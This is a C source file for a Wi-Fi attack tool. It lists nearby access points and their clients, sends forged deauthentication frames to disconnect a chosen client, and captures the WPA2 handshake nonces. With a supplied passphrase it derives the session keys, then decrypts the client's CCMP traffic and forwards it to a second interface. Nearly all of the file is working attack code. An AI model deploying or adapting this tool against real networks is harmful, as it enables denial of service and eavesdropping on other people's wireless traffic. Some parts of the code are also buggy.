#include <unistd.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include "pcap.h"
#include "ieee80211.h"
#include "ieee80211_radiotap.h"
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <openssl/aes.h>
#include <openssl/crypto.h>
#include <openssl/ssl.h>
#include <openssl/dh.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

typedef enum _IEEE80211_ENCRYPTION
{
    IEEE80211_ENCRYPTION_UNKNOWN,
    IEEE80211_ENCRYPTION_OPEN,
    IEEE80211_ENCRYPTION_WEP,
    IEEE80211_ENCRYPTION_WPA,
    IEEE80211_ENCRYPTION_WPA2,
    IEEE80211_ENCRYPTION_WPA2WPA
} IEEE80211_ENCRYPTION;

struct ap_info
{
    char ssid[100];
    uint8_t bssid[IEEE80211_ADDR_LEN];
    uint8_t channel;
    IEEE80211_ENCRYPTION enc;
    uint8_t signal;
    uint8_t dev[100][IEEE80211_ADDR_LEN];
    int total_dev;
};

struct deauth_frame
{
    u_int8_t i_fc[2];
    u_int16_t i_dur;
    u_int8_t i_addr1[IEEE80211_ADDR_LEN];
    u_int8_t i_addr2[IEEE80211_ADDR_LEN];
    u_int8_t i_addr3[IEEE80211_ADDR_LEN];
    u_int8_t i_seq[2];
} __attribute__((packed));

struct options
{
    unsigned char passphrase[65];
    unsigned char pmk[32];
};

struct reason_code
{
    uint16_t reason;
} __attribute__((packed));

struct radiotap_header
{
    uint8_t vision;
    uint8_t pad;
    uint16_t len;
    uint32_t present1;
    uint32_t present2;
    uint8_t flags;
    uint8_t rate;
    uint16_t channel_frequency;
    uint16_t channel_flag;
    uint8_t signal1;
    uint8_t padding;
    uint16_t rx_flag;
    uint8_t signal2;
    uint8_t antena;
} __attribute__((packed));

struct tag
{
    uint8_t tag_name;
    uint8_t tag_len;
    uint8_t data[0];
} __attribute__((packed));

struct vender_info
{
    uint8_t tag_name;
    uint8_t tag_len;
    uint32_t tag_oui : 24;
    uint8_t tag_oui_type;
    uint8_t oui_data[0];
} __attribute__((packed));

struct ccmp
{
    uint8_t ccmp[8];
} __attribute__((packed));

struct LLC
{
    uint8_t dsap;
    uint8_t ssap;
    uint8_t cf;
    uint8_t Org_Code[3];
    uint16_t type;
} __attribute__((packed));

struct EAP_info
{
    uint8_t version;
    uint8_t type;
    uint16_t len;
    uint8_t key_type;
    uint16_t key_info;
    uint16_t key_len;
    uint64_t replay_counter;
    uint8_t key_nonce[32];
    uint8_t key_iv[16];
    uint8_t key_rsc[8];
    uint8_t key_id[8];
    uint8_t MIC[16];
    uint16_t data_len;
    uint8_t data[0];
} __attribute__((packed));

struct ap_info Buf_AP[100];
int total_ap = 0;

pcap_t *adhandle;
pcap_t *adhandle2;

uint8_t Anonce[32];
uint8_t Snonce[32];

int stop = 0;
int is_key;
unsigned char TK[16];

int is_equal(uint8_t com1[], uint8_t com2[], int len);

int getch()
{
    int ch;

    struct termios buf;
    struct termios save;

    tcgetattr(0, &save);
    buf = save;

    buf.c_lflag &= ~(ICANON | ECHO);
    buf.c_cc[VMIN] = 1;
    buf.c_cc[VTIME] = 0;

    tcsetattr(0, TCSAFLUSH, &buf);

    ch = getchar();
    tcsetattr(0, TCSAFLUSH, &save);

    return ch;
}

void *print(void *arg)
{
    while (1)
    {
        if (stop == 0)
        {
            sleep(1);
            system("clear");

            for (int i = 0; i < total_ap; i++)
            {
                printf("Buf_AP[%d], ", i);
                printf("SSID = %s, ", Buf_AP[i].ssid);
                printf("BSSID = %02X:%02X:%02X:%02X:%02X:%02X, ", Buf_AP[i].bssid[0], Buf_AP[i].bssid[1], Buf_AP[i].bssid[2], Buf_AP[i].bssid[3], Buf_AP[i].bssid[4], Buf_AP[i].bssid[5]);
                printf("SIGNAL = %d, ", (int)Buf_AP[i].signal - 256);
                printf("CHANNEL = %d, ", Buf_AP[i].channel);
                switch (Buf_AP[i].enc)
                {
                case IEEE80211_ENCRYPTION_WPA2:
                    printf("ECN = WPA2");
                    break;

                case IEEE80211_ENCRYPTION_WPA2WPA:
                    printf("ECN = WPA/WPA2");
                    break;

                case IEEE80211_ENCRYPTION_WEP:
                    printf("ECN = WEP");
                    break;

                case IEEE80211_ENCRYPTION_OPEN:
                    printf("ECN = OPEN");
                    break;
                }

                printf("\n");
                for (int j = 0; j < Buf_AP[i].total_dev; j++)
                {
                    printf("    (DEV(%d)) %02X:%02X:%02X:%02X:%02X:%02X\n", j, Buf_AP[i].dev[j][0], Buf_AP[i].dev[j][1], Buf_AP[i].dev[j][2], Buf_AP[i].dev[j][3], Buf_AP[i].dev[j][4], Buf_AP[i].dev[j][5]);
                }
            }
        }
    }
}

void *scan(void *arg)
{
    while (1)
    {
        if (stop == 0)
        {
            char ch = getch();
            if (ch == 'a' || ch == 'A')
            {
                stop = 1;
                sleep(1);
                char pass[100] = { 0 };

                // printf("input plz : ");
                // int test;
                // scanf("%d", &test);

                int bssid_num = 0;
                int dev_num = 0;
                printf("BSSID num : ");
                scanf("%d", &bssid_num);
                printf("\nDEV num : ");
                scanf("%d", &dev_num);
                printf("\nPASSWORD : ");
                scanf("%s", pass);

                struct radiotap_header rh;
                rh.vision = 0;
                rh.pad = 0;
                rh.len = sizeof(rh);
                rh.present1 = 0x2e4000a0;
                rh.present2 = 0x20080000;
                rh.flags = 0;
                rh.channel_flag = 0xa000;
                rh.rx_flag = 0x00;
                rh.antena = 0;
                rh.padding = 0;

                struct deauth_frame fh;
                fh.i_fc[0] = IEEE80211_FC0_SUBTYPE_DEAUTH;
                fh.i_fc[1] = 0x00;
                fh.i_dur = 314;
                memcpy(fh.i_addr1, Buf_AP[bssid_num].dev[dev_num], IEEE80211_ADDR_LEN);
                memcpy(fh.i_addr2, Buf_AP[bssid_num].bssid, IEEE80211_ADDR_LEN);
                memcpy(fh.i_addr3, Buf_AP[bssid_num].bssid, IEEE80211_ADDR_LEN);

                fh.i_seq[0] = 0;
                fh.i_seq[1] = 0;

                struct reason_code rch;
                rch.reason = htons(0x0100);

                uint8_t packet[2500] = {0};
                int len = 0;

                memcpy(packet, &rh, sizeof(rh));
                len += sizeof(rh);
                memcpy(packet + len, &fh, sizeof(fh));
                len += sizeof(fh);
                memcpy(packet + len, &rch, sizeof(rch));
                len += sizeof(rch);

                for (int i = 0; i < 5; i++)
                {
                    pcap_sendpacket(adhandle, packet, len);
                    sleep(1);
                }

                while (1)
                {
                    struct pcap_pkthdr *header;
                    const unsigned char *pkt_data;
                    int datalen = 0;
                    int res;
                    int i;

                    res = pcap_next_ex(adhandle, &header, &pkt_data);
                    if (res == 0)
                        continue;

                    struct ieee80211_radiotap_header *rah;
                    rah = (struct ieee80211_radiotap_header *)(pkt_data);
                    datalen += rah->it_len;

                    struct ieee80211_frame *fh;
                    fh = (struct ieee80211_frame *)(pkt_data + datalen);

                    uint8_t sub = fh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;
                    uint8_t type = fh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;

                    if (type == IEEE80211_FC0_TYPE_DATA && sub == IEEE80211_FC0_SUBTYPE_QOS)
                    {
                        struct ieee80211_qosframe *qosdata;
                        qosdata = (struct ieee80211_qosframe *)(pkt_data + datalen);
                        datalen += sizeof(*qosdata);

                        uint8_t qostemp = qosdata->i_fc[1] & IEEE80211_FC1_DIR_MASK;

                        if (qostemp == IEEE80211_FC1_DIR_FROMDS || qostemp == IEEE80211_FC1_DIR_TODS)
                        {
                            if ((is_equal(Buf_AP[bssid_num].bssid, qosdata->i_addr2, IEEE80211_ADDR_LEN) && is_equal(Buf_AP[bssid_num].dev[dev_num], qosdata->i_addr1, IEEE80211_ADDR_LEN)) ||
                                (is_equal(Buf_AP[bssid_num].bssid, qosdata->i_addr1, IEEE80211_ADDR_LEN) && is_equal(Buf_AP[bssid_num].dev[dev_num], qosdata->i_addr2, IEEE80211_ADDR_LEN)))
                            {
                                if (is_key == 0)
                                {
                                    struct LLC *LLCh;
                                    LLCh = (struct LLC *)(pkt_data + datalen);

                                    if (LLCh->type == htons(0x888e))
                                    {
                                        datalen += sizeof(*LLCh);
                                        unsigned char PMK[256];
                                        struct EAP_info *E_info;
                                        E_info = (struct EAP_info *)(pkt_data + datalen);

                                        if (ntohs(E_info->key_info) == 0x008a)
                                        {

                                            memcpy(Anonce, E_info->key_nonce, 32);

                                            printf("Anonce : ");

                                            for (i = 0; i < 32; i++)
                                            {
                                                printf("%x", E_info->key_nonce[i]);
                                            }
                                            printf("\n");
                                        }
                                        else if (ntohs(E_info->key_info) == 0x010a)
                                        {

                                            memcpy(Snonce, E_info->key_nonce, 32);

                                            printf("Snonce : ");

                                            for (i = 0; i < 32; i++)
                                            {
                                                printf("%x", E_info->key_nonce[i]);
                                            }
                                            printf("\n");

                                            struct options opinfo = {0};

                                            PKCS5_PBKDF2_HMAC_SHA1(pass, strlen(pass), (const unsigned char *)Buf_AP[bssid_num].ssid, strlen(Buf_AP[bssid_num].ssid), 4096, 32, opinfo.pmk);

                                            printf("PMK : ");
                                            for (i = 0; i < 32; i++)
                                            {
                                                printf("%x", opinfo.pmk[i]);
                                            }
                                            printf("\n");
                                            unsigned char pke[100] = {
                                                0x50,
                                                0x61,
                                                0x69,
                                                0x72,
                                                0x77,
                                                0x69,
                                                0x73,
                                                0x65,
                                                0x20,
                                                0x6B,
                                                0x65,
                                                0x79,
                                                0x20,
                                                0x65,
                                                0x78,
                                                0x70,
                                                0x61,
                                                0x6E,
                                                0x73,
                                                0x69,
                                                0x6F,
                                                0x6E,
                                                0x00,
                                            };
                                            unsigned char PTK[80] = {0};

                                            int pkepo = 23;

                                            if (Buf_AP[bssid_num].bssid[0] < Buf_AP[bssid_num].dev[dev_num][0])
                                            {
                                                memcpy(pke + pkepo, Buf_AP[bssid_num].bssid, IEEE80211_ADDR_LEN);
                                                pkepo += IEEE80211_ADDR_LEN;
                                                memcpy(pke + pkepo, Buf_AP[bssid_num].dev[dev_num], IEEE80211_ADDR_LEN);
                                                pkepo += IEEE80211_ADDR_LEN;
                                            }

                                            else
                                            {
                                                memcpy(pke + pkepo, Buf_AP[bssid_num].dev[dev_num], IEEE80211_ADDR_LEN);
                                                pkepo += IEEE80211_ADDR_LEN;
                                                memcpy(pke + pkepo, Buf_AP[bssid_num].bssid, IEEE80211_ADDR_LEN);
                                                pkepo += IEEE80211_ADDR_LEN;
                                            }

                                            if (Anonce[0] < Snonce[0])
                                            {
                                                memcpy(pke + pkepo, Anonce, 32);
                                                pkepo += 32;
                                                memcpy(pke + pkepo, Snonce, 32);
                                                pkepo += 32;
                                            }

                                            else
                                            {
                                                memcpy(pke + pkepo, Snonce, 32);
                                                pkepo += 32;
                                                memcpy(pke + pkepo, Anonce, 32);
                                                pkepo += 32;
                                            }

                                            for (i = 0; i < 4; i++)
                                            {
                                                pke[99] = i;
                                                HMAC(EVP_sha1(), opinfo.pmk, 32, pke, 100, PTK + i * 20, NULL);
                                            }

                                            printf("PTK : ");
                                            for (i = 0; i < 80; i++)
                                            {
                                                printf("%X ", PTK[i]);
                                            }
                                            printf("\n");

                                            for (i = 0; i < 16; i++)
                                            {
                                                TK[i] = PTK[i + 32];
                                            }

                                            printf("TK : ");
                                            for (i = 0; i < 16; i++)
                                            {
                                                printf("%X ", TK[i]);
                                            }
                                            printf("\n");

                                            is_key = 1;
                                        }
                                    }
                                }

                                else if (is_key == 1)
                                {
                                    const unsigned char *datatemp = (const char *)(pkt_data + datalen);
                                    int datatemplen = header->len - datalen;
                                    datalen = 0;

                                    struct ccmp *ccmpdata;

                                    ccmpdata = (struct ccmp *)(datatemp);
                                    datalen += sizeof(*ccmpdata);

                                    unsigned char ta[IEEE80211_ADDR_LEN];
                                    unsigned char PN[6];

                                    for (i = 0; i < IEEE80211_ADDR_LEN; i++)
                                    {
                                        ta[i] = qosdata->i_addr2[i];
                                    }

                                    PN[5] = ccmpdata->ccmp[0];
                                    PN[4] = ccmpdata->ccmp[1];
                                    PN[3] = ccmpdata->ccmp[4];
                                    PN[2] = ccmpdata->ccmp[5];
                                    PN[1] = ccmpdata->ccmp[6];
                                    PN[0] = ccmpdata->ccmp[7];

                                    int data_size = datatemplen - datalen;

                                    int block_len = data_size / 16;

                                    if (data_size % 16 != 0)
                                    {
                                        block_len++;
                                    }
                                    unsigned char decryptdata[data_size];

                                    AES_KEY key;
                                    AES_set_encrypt_key(TK, 128, &key);

                                    for (int i = 0; i < block_len; i++)
                                    {
                                        unsigned char Nonce[16] = {
                                            0x01, // flag
                                            0x00, // priority
                                        };

                                        memcpy(Nonce + 2, ta, sizeof(ta));
                                        memcpy(Nonce + 2 + sizeof(ta), PN, 6);

                                        Nonce[14] = 0x00;
                                        Nonce[15] = i + 1; //Ctr

                                        unsigned char decrypt_block[16] = {0};
                                        AES_ecb_encrypt(Nonce, decrypt_block, &key, AES_ENCRYPT); // make decrypt_block from Nonce

                                        unsigned char Dtemp[16] = {0};
                                        for (int j = 0; j < 16; j++)
                                        {
                                            int Dpointer = (i * 16) + j;
                                            Dtemp[j] = (unsigned char)datatemp[Dpointer + datalen];
                                            decryptdata[Dpointer] = Dtemp[j] ^ decrypt_block[j];
                                        }
                                    }

                                    data_size -= 8; //data_size - MIC size;
                                    data_size -= sizeof(struct LLC);
                                    datalen = sizeof(struct LLC);

                                    unsigned char outdata[data_size + 14];
                                    memcpy(outdata, Buf_AP[bssid_num].bssid, IEEE80211_ADDR_LEN);
                                    memcpy(outdata + 6, Buf_AP[bssid_num].dev[dev_num], IEEE80211_ADDR_LEN);

                                    outdata[12] = 0x08;
                                    outdata[13] = 0x00;

                                    memcpy(outdata + 14, decryptdata + datalen, data_size);

                                    pcap_sendpacket(adhandle2, outdata, sizeof(outdata));
                                }
                            }
                        }
                    }
                }

                stop = 0;
            }
        }
    }
}

int main()
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    pcap_if_t *d;
    struct pcap_addr *a;
    int i = 0;
    int no;

    if (pcap_findalldevs(&alldevs, errbuf) < 0)
    {
        printf("pcap_findalldevs error\n");
        return 1;
    }

    for (d = alldevs; d; d = d->next)
    {
        printf("%d :  %s\n", ++i, (d->description) ? (d->description) : (d->name));
    }

    printf("number : ");
    scanf("%d", &no);

    if (!(no > 0 && no <= i))
    {
        printf("number error\n");
        return 1;
    }

    for (d = alldevs, i = 0; d; d = d->next)
    {
        if (no == ++i)
            break;
    }

    if (!(adhandle = pcap_open_live(d->name, 65536, 1, 1000, errbuf)))
    {
        printf("pcap_open_live error %s\n", d->name);
        pcap_freealldevs(alldevs);
        return -1;
    }

    pcap_freealldevs(alldevs);

    char errbuf2[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs2;
    pcap_if_t *d2;
    struct pcap_addr *a2;
    i = 0;
    int no2;

    if (pcap_findalldevs(&alldevs2, errbuf2) < 0)
    {
        printf("pcap_findalldevs error\n");
        return 1;
    }

    for (d2 = alldevs2; d2; d2 = d2->next)
    {
        printf("%d :  %s\n", ++i, (d2->description) ? (d2->description) : (d2->name));
    }

    printf("number : ");
    scanf("%d", &no2);

    if (!(no2 > 0 && no2 <= i))
    {
        printf("number error\n");
        return 1;
    }

    for (d2 = alldevs2, i = 0; d2; d2 = d2->next)
    {
        if (no2 == ++i)
            break;
    }

    if (!(adhandle2 = pcap_open_live(d2->name, 65536, 1, 1000, errbuf2)))
    {
        printf("pcap_open_live error %s\n", d2->name);
        pcap_freealldevs(alldevs2);
        return -1;
    }

    pcap_freealldevs(alldevs2);

    if (stop == 0)
    {
        int status;
        pthread_t p_thread = pthread_create(&p_thread, NULL, print, NULL);
        pthread_join(p_thread, (void **)&status);
    }

    int status2;
    int test_1 = 1;
    pthread_t p_thread2 = pthread_create(&p_thread2, NULL, scan, NULL);
    pthread_join(p_thread2, (void **)&status2);

    while (1)
    {
        struct pcap_pkthdr *header;
        const unsigned char *pkt_data;
        int datalen = 0;
        int res;
        int i;

        if (stop == 0)
        {
            res = pcap_next_ex(adhandle, &header, &pkt_data);
            if (res == 0)
                continue;

            struct ap_info info;
            struct radiotap_header *rah;
            rah = (struct radiotap_header *)(pkt_data);
            datalen += rah->len;

            struct ieee80211_frame *fh;
            fh = (struct ieee80211_frame *)(pkt_data + datalen);

            uint8_t type = fh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
            uint8_t sub = fh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

            if (type == IEEE80211_FC0_TYPE_MGT && sub == IEEE80211_FC0_SUBTYPE_BEACON)
            {
                info.signal = rah->signal1;
                datalen += sizeof(*fh);
                memcpy(info.bssid, fh->i_addr3, IEEE80211_ADDR_LEN);

                uint16_t captemp;

                ieee80211_mgt_beacon_t fixed = (ieee80211_mgt_beacon_t)(pkt_data + datalen);
                datalen += sizeof(uint8_t) * 12;

                captemp = IEEE80211_BEACON_CAPABILITY(fixed);

                if (captemp & IEEE80211_CAPINFO_PRIVACY)
                {
                    info.enc = IEEE80211_ENCRYPTION_WEP;
                }

                else
                {
                    info.enc = IEEE80211_ENCRYPTION_OPEN;
                }

                do
                {
                    struct tag *tag_info;
                    tag_info = (struct tag *)(pkt_data + datalen);

                    if (tag_info->tag_name == IEEE80211_ELEMID_SSID)
                    {
                        if (tag_info->tag_len != 0 || tag_info->data != 0x00)
                        {
                            memset(info.ssid, 0, sizeof(info.ssid));
                            memcpy(info.ssid, tag_info->data, tag_info->tag_len);
                        }
                        else
                        {
                            strcpy(info.ssid, "secret");
                        }
                    }

                    else if (tag_info->tag_name == IEEE80211_ELEMID_DSPARMS)
                    {
                        info.channel = tag_info->data[0];
                    }

                    else if (tag_info->tag_name == IEEE80211_ELEMID_RSN)
                    {
                        info.enc = IEEE80211_ENCRYPTION_WPA2;
                    }

                    if (tag_info->tag_name == IEEE80211_ELEMID_VENDOR)
                    {
                        struct vender_info *v_info;
                        v_info = (struct vender_info *)(pkt_data + datalen);

                        if (v_info->tag_oui == WPA_OUI && v_info->tag_oui_type == WPA_OUI_TYPE)
                        {
                            if (info.enc == IEEE80211_ENCRYPTION_WPA2)
                            {
                                info.enc = IEEE80211_ENCRYPTION_WPA2WPA;
                            }
                            else
                            {
                                info.enc = IEEE80211_ENCRYPTION_WPA;
                            }
                        }
                    }
                    datalen += (tag_info->tag_len + sizeof(uint8_t) * 2);

                } while (datalen < (int)header->len);

                int count = 0;

                for (i = 0; i < total_ap; i++)
                {
                    if (is_equal(Buf_AP[i].bssid, info.bssid, IEEE80211_ADDR_LEN))
                    {
                        count = 1;
                        break;
                    }
                }

                if (!count)
                {
                    info.total_dev = 0;
                    Buf_AP[total_ap] = info;
                    total_ap++;
                }
                else
                {
                    Buf_AP[i].signal = info.signal;
                }
            }
            else if (type == IEEE80211_FC0_TYPE_DATA && sub == IEEE80211_FC0_SUBTYPE_QOS)
            {
                struct ieee80211_qosframe *qh;
                qh = (struct ieee80211_qosframe *)(pkt_data + datalen);
                uint8_t qostemp = qh->i_fc[1] & IEEE80211_FC1_DIR_MASK;

                if (qostemp == IEEE80211_FC1_DIR_FROMDS)
                {
                    int count = 0;

                    for (i = 0; i < total_ap; i++)
                    {
                        if (is_equal(Buf_AP[i].bssid, qh->i_addr2, IEEE80211_ADDR_LEN))
                        {
                            count = 1;
                            break;
                        }
                    }

                    if (count)
                    {
                        count = 0;
                        int j;
                        for (j = 0; j < Buf_AP[i].total_dev; j++)
                        {
                            if (is_equal(Buf_AP[i].dev[j], qh->i_addr1, IEEE80211_ADDR_LEN))
                            {
                                count = 1;
                                break;
                            }
                        }
                        if (!count)
                        {
                            memcpy(Buf_AP[i].dev[Buf_AP[i].total_dev], qh->i_addr1, IEEE80211_ADDR_LEN);
                            Buf_AP[i].total_dev++;
                        }
                    }
                }
                else if (qostemp == IEEE80211_FC1_DIR_TODS)
                {
                    int count = 0;

                    for (i = 0; i < total_ap; i++)
                    {
                        if (is_equal(Buf_AP[i].bssid, qh->i_addr1, IEEE80211_ADDR_LEN))
                        {
                            count = 1;
                            break;
                        }
                    }

                    if (count)
                    {
                        count = 0;
                        int j;
                        for (j = 0; j < Buf_AP[i].total_dev; j++)
                        {
                            if (is_equal(Buf_AP[i].dev[j], qh->i_addr2, IEEE80211_ADDR_LEN))
                            {
                                count = 1;
                                break;
                            }
                        }

                        if (!count)
                        {
                            memcpy(Buf_AP[i].dev[Buf_AP[i].total_dev], qh->i_addr2, IEEE80211_ADDR_LEN);
                            Buf_AP[i].total_dev++;
                        }
                    }
                }
            }
        }
    }
}

int is_equal(uint8_t com1[], uint8_t com2[], int len)
{
    int count = 1;
    int i = 0;
    for (i = 0; i < len; i++)
    {
        if (com1[i] == com2[i])
            continue;
        else
        {
            count = 0;
            break;
        }
    }
    return count;
}